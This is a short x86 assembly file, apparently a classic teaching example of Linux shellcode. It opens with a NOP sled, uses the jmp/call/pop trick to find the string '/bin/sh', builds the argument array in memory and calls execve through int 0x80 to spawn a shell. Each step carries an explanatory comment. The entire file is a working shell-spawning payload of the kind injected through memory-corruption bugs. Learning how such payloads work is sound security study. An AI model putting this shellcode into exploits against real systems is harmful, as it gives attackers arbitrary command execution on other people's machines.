nop
nop
nop

jmp short mycall				; jump to the call instrustion

shellcode:
	pop			esi				; store address of "/bin/sh" in ESI
	xor			eax,eax 		; zero out EAX
	mov byte	[esi + 7], al	; write null byte at the end of the string

	mov dword	[esi + 8], esi	; the memory immdeiatley below the string
								; "/bin/sh" will constain the array pointed
								; to by the second argument of execve(2)
								; therefore we store in [ESI+8] the address
								; of the string
	mov dword 	[esi+12], eax 	; and in ESI+12 the NULL pointer (EAX is zero)
	mov			al, 0xb			; store the number of the syscall (11) in EAX
	lea			ebx, [esi]		; copy the address of the string in EBX
	lea			ecx, [esi + 8]	; second argument to execve(2)
	lea			edx, [esi + 12]	; third argument to execve(2) (NULL pointer)
	int 		0x80			; execute the shellcode

mycall:
	call		shellcode		; push the address of "/bin/sh" onto the stack
	db			"/bin/sh"
